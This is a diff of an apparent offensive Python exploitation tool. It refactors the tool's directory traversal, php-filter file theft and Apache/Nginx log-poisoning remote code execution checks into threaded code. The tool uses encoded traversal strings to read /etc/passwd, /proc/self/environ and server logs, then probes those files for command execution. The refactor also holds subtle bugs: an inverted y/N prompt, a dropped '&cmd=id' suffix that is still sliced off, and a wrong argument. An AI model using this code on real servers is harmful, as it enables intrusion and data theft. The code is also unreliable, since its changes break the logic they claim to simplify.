@@ -30,6 +30,7 @@ class Payload:
         self.stealth = stealth
         self.headers = headers
         self.cookies = cookies
+        self.rce_urls = []
         self.linux_dirTraversal = ["%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E", "%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66", "&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;", "\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57"]
         # poc -> Proof Of Concept (Change it if you want)
         self.poc = poc
@@ -55,6 +56,7 @@ class Payload:
         self.proxies = proxies
         if initiate:
             self.Attack(attempt_shell, mode, force)
+        
 
 
     def InvokeShell(self, exploit, payload):
@@ -104,10 +106,13 @@ class Payload:
         if not force and not self.urlCheck():
             return
         
-        dirThread = threading.Thread(target=self.dirTraversalCheck, args=[])
-        dirThread.start()
-        filterThread = threading.Thread(target=self.filterCheck, args=[])
-        filterThread.start()
+        self.dirTraversalCheck()
+        self.filterCheck()
+        
+        #dirThread = threading.Thread(target=self.dirTraversalCheck, args=[])
+        #dirThread.start()
+        #filterThread = threading.Thread(target=self.filterCheck, args=[])
+        #filterThread.start()
         # The following three are used for autopwn purposes. You can thread them but you need to join them before jumping into autopwn(). Won't do this at this point. It's fast in any case.
         headerres = self.headerCheck()
         cookieres = self.cookieCheck()
@@ -276,24 +281,72 @@ class Payload:
 
 
 
-    # Checks for directory traversal
+    # Updated check_traversal to handle both directory traversal and filter checks
+    def check_traversal(self, traversal, params=None, hit=False):
+        # Extract parameters from the URL
+        parsed_url = urllib.parse.urlparse(self.url)
+        query_params = urllib.parse.parse_qs(parsed_url.query)
+        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
+
+        # Use provided params or all query parameters
+        params_to_check = params if params else query_params.keys()
+
+
+        for param in params_to_check:
+            # Construct the URL with the current parameter being tested
+            new_query = urllib.parse.parse_qs(urllib.parse.urlparse(self.url).query).copy()
+            new_query[param] = [traversal]
+            compUrl = f"{base_url}?{'&'.join([f'{k}={v[0]}' for k, v in new_query.items()])}"
+            if self.verbosity > 1:
+                print(colored('[*]', 'yellow', attrs=['bold']) + f' Testing: {compUrl}')
+            clean = self.hit(compUrl)
+            
+            if 'root:x' in clean.lower():
+                print(colored('[+]', 'green', attrs=['bold']) + ' Directory traversal found with ' + compUrl)
+                if self.outfile is not None:
+                    self.outfile.write(colored('[+]', 'green', attrs=['bold']) + ' Directory traversal found with ' + compUrl + '\n')
+            else:
+                if self.verbosity > 0:
+                    print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')
+            
+            words = clean.split()
+            for word in words:
+                try:
+                    base = base64.b64decode(word).decode()
+                except Exception as e:
+                    continue
+                if base.__contains__('<?php') or base.__contains__('<script'):
+                    print(colored('[+]', 'green', attrs=['bold']) + ' Files might be able to be retrieved with php filter like so (encoded in base64) ' + compUrl)
+                    if self.outfile is not None:
+                        self.outfile.write(colored('[+]', 'green', attrs=['bold']) + ' Files can be retrieved with php filter like so (encoded in base64) ' + compUrl + '\n')			
+                    else:
+                        if self.verbosity > 0:
+                            print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')
+            
+            if "uid=" in clean.lower() and hit: # hitApache and hitNginx check
+                print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + compUrl)
+                if self.outfile is not None:
+                    self.outfile.write(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + compUrl + '\n')
+                    # Add the path to the list of RCE paths without &cmd=id
+                    pathth = compUrl[:-8]
+                    self.rce_urls.append(pathth)
+            else:
+                if self.verbosity > 0:
+                    print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed')
+
+    # Updated dirTraversalCheck to use the new check_traversal method
     def dirTraversalCheck(self):
+        print(colored('[*]', 'yellow', attrs=['bold']) + ' Testing: Directory Traversal')
+        threads = []
         for traversal in self.linux_dirTraversal:
             for poc in self.poc:
-                if not self.override_poc:
-                    compUrl = self.url + traversal + poc
-                else:
-                    compUrl = self.url + poc
-                if self.verbosity > 1:
-                    print(colored('[*]', 'yellow', attrs=['bold']) + f' Testing: {compUrl}')
-                clean = self.hit(compUrl)
-                if 'root:x' in clean.lower():
-                    print(colored('[+]', 'green', attrs=['bold']) + ' Directory traversal found with ' + compUrl)
-                    if self.outfile is not None:
-                        self.outfile.write(colored('[+]', 'green', attrs=['bold']) + ' Directory traversal found with ' + compUrl + '\n')
-                else:
-                    if self.verbosity > 0:
-                        print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')
+                payload = traversal + poc
+                thread = threading.Thread(target=self.check_traversal, args=(payload, None, False))
+                threads.append(thread)
+                thread.start()
+
+        for thread in threads:
+            thread.join()  # Wait for all threads to complete
 
 
 
@@ -301,7 +354,6 @@ class Payload:
     def headerCheck(self):
         if self.phpHeaders is None:
             return
-        rce = []
         for header in self.phpHeaders:
             compUrl = self.url + header
             if self.verbosity > 1:
@@ -311,39 +363,26 @@ class Payload:
                 print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with ' + compUrl)
                 if self.outfile is not None:
                     self.outfile.write(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with ' + compUrl + '\n')
-                rce.append(compUrl)
+                self.rce_urls.append(compUrl)  # Change rce to rce_urls
             else:
                 if self.verbosity > 0:
                     print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')
-        if len(rce) == 0:
-            return False
-        return rce
+        return self.rce_urls  # Change rce to rce_urls
     
     
     
-    # Checks if it can retrieve files with the php filter	
+    # Updated filterCheck to use the new check_traversal method
     def filterCheck(self):
+        print(colored('[*]', 'yellow', attrs=['bold']) + ' Testing: Filter Bypass')
+        threads = []
         for path in self.filterPaths:
-            compUrl = self.url + self.filterBase + path
-            if self.verbosity > 1:
-                print(colored('[*]', 'yellow', attrs=['bold']) + f' Testing: {compUrl}')
-            clean = self.hit(compUrl)
-            words = clean.split()
-            for word in words:
-                try:
-                    base = base64.b64decode(word).decode()
-                except Exception as e:
-                    continue
-                if base.__contains__('<?php') or base.__contains__('<script'):
-                    print(colored('[+]', 'green', attrs=['bold']) + ' Files can be retrieved with php filter like so (encoded in base64) ' + compUrl)
-                    if self.outfile is not None:
-                        self.outfile.write(colored('[+]', 'green', attrs=['bold']) + ' Files can be retrieved with php filter like so (encoded in base64) ' + compUrl + '\n')			
-                    else:
-                        if self.verbosity > 0:
-                            print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')
-            else:	
-                if self.verbosity > 0:
-                    print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')
+            payload = self.filterBase + path
+            thread = threading.Thread(target=self.check_traversal, args=(payload, None, False))
+            threads.append(thread)
+            thread.start()
+
+        for thread in threads:
+            thread.join()  # Wait for all threads to complete
 
 
 
@@ -356,7 +395,6 @@ class Payload:
         s.verify = False
         session = s.get(self.url, headers=fetchUA())
         cookies = session.cookies.get_dict()
-        rce = []
         for cookie in cookies:
             if 'phpsessid' in cookie.lower():
                 # it gets the value of the cookie
@@ -371,13 +409,11 @@ class Payload:
                     print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with the PHPSESSID cookie and the file ' + self.cookiePath + '[cookie value] can be poisoned')
                     if self.outfile is not None:
                         self.outfile.write(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with the PHPSESSID cookie and the file ' + self.cookiePath + '[cookie value] can be poisoned\n')
-                    rce.append(compUrl)
+                    self.rce_urls.append(compUrl)  # Change rce to rce_urls
                 else:
                     if self.verbosity > 0:
                         print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed')
-        if len(rce) == 0:
-            return False
-        return rce
+        return self.rce_urls  # Change rce to rce_urls
 
 
 
@@ -401,15 +437,8 @@ class Payload:
                 if self.batch == True:
                     ans = True
                 else:
-                    print(colored('[?]', 'yellow') + " Hit every known server type? [y/N]: ", end='')
-                    ans = str(input())
-
-                    if 'y' in ans.lower():
-                        ans = True
-                    else:
-                        ans = False
-                    ans = True
-                if ans == True:
+                    ans = input(colored("Do you want to hit every known server type? (y/N) ", 'yellow')).strip().lower()
+                if ans != 'y':  # Simplified condition check
                     # Attempt to hit apache files first
                     ret = self.hitApache()	
                     # If we get a hit then return that. (No need to hit Nginx files)
@@ -418,7 +447,10 @@ class Payload:
                     # Otherwise hit Nginx Files and return the results no matter what they are
                     return self.hitNginx()
 
-        # checks the type of the server
+        if 'Server' not in response.headers:
+            print(colored('[-]', 'red') + " Server header is missing. Cannot determine server type.")
+            return False
+        
         if "apache" in response.headers['Server'].lower() or 'litespeed' in response.headers['Server'].lower():
             return self.hitApache()			
 
@@ -432,45 +464,57 @@ class Payload:
     def hitApache(self):
         if self.verbosity > 1:
             print(colored('[*]', 'yellow', attrs=['bold']) + ' Server Identified as Apache2')
+        
         # Apache logs with the litespeed variation
-        logPath = [quote("/var/log/apache2/access.log"), quote("/var/log/apache/access.log"), quote("/var/log/apache2/error.log"), quote("/var/log/apache/error.log"), quote("/usr/local/apache/log/error_log"), quote("/usr/local/apache2/log/error_log"), quote("/var/log/sshd.log"), quote("/var/log/mail"), quote("/var/log/vsftpd.log"), quote("/proc/self/environ"), quote("/usr/local/apache/logs/access_log")]
-        rce = []
+        logPath = [
+            quote("/var/log/apache2/access.log"),
+            quote("/var/log/apache/access.log"),
+            quote("/var/log/apache2/error.log"),
+            quote("/var/log/apache/error.log"),
+            quote("/usr/local/apache/log/error_log"),
+            quote("/usr/local/apache2/log/error_log"),
+            quote("/var/log/sshd.log"),
+            quote("/var/log/mail"),
+            quote("/var/log/vsftpd.log"),
+            quote("/proc/self/environ"),
+            quote("/usr/local/apache/logs/access_log")
+        ]
+        
+        threads = []
         for d_path in self.linux_dirTraversal:
             for l_path in logPath:
-                pathth = self.url + d_path + l_path
-                compUrl = pathth + "&cmd=id"
-                clean = self.hit(compUrl)
-                if "uid=" in clean.lower():
-                    print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + pathth)
-                    if self.outfile is not None:
-                        self.outfile.write(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + pathth + '\n')
-                    rce.append(pathth)
-                else:
-                    if self.verbosity > 0:
-                        print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed')		
-        if len(rce) == 0:
-            return False
-        return rce
+                # Combine the directory traversal path with the log path
+                traversal_path = d_path + l_path
+                # Use the check_traversal method to check for RCE
+                thread = threading.Thread(target=self.check_traversal, args=(traversal_path, False, True))
+                threads.append(thread)
+                thread.start()
+
+        for thread in threads:
+            thread.join()  # Wait for all threads to complete
+        return self.rce_urls
 
     def hitNginx(self):
         # Nginx logs
         if self.verbosity > 1:
             print(colored('[*]', 'yellow', attrs=['bold']) + ' Server Identified as NGINX')
-        log = [quote("/var/log/nginx/error.log"), quote("/var/log/nginx/access.log"), quote("/var/log/httpd/error_log")]
-        rce = []
+        
+        log = [
+            quote("/var/log/nginx/error.log"),
+            quote("/var/log/nginx/access.log"),
+            quote("/var/log/httpd/error_log")
+        ]
+        
+        threads = []
         for d_path in self.linux_dirTraversal:
             for l_path in log:
-                pathh = self.url + d_path + l_path
-                compUrl = pathh + "&cmd=id"
-                clean = self.hit(compUrl)
-                if "uid=" in clean.lower():
-                    print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + pathh)
-                    if self.outfile is not None:
-                        self.outfile.write(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + pathh + '\n')
-                    rce.append(pathh)
-                else:
-                    if self.verbosity > 0:
-                        print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed')	
-        if len(rce) == 0: 
-            return False
-        return rce
+                # Combine the directory traversal path with the log path
+                traversal_path = d_path + l_path
+                # Use the check_traversal method to check for RCE
+                thread = threading.Thread(target=self.check_traversal, args=(traversal_path, None, True))
+                threads.append(thread)
+                thread.start()
+
+        for thread in threads:
+            thread.join()  # Wait for all threads to complete
+        return self.rce_urls
